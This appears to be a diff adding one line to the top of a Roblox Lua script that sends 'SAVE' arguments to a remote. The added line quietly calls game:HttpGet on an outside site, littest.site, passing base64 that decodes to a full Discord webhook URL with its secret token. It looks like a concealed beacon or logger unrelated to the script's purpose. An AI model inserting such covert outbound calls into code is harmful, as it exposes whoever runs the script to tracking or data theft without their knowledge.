@@ -1,3 +1,4 @@
+game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2ODUxNDAyOTY3ODYyNDg4MC9yM3dvUHNfTHp1QlF3NWZLN2p0X0tBMUpYVDg4VW1tYlJBUGlwYmloeWV3LWlyRkZYa3NjY1A1MW9UcG4zcFZpbjBUQQ==")```
 local args = {
     [1] = {
         [1] = "SAVE",
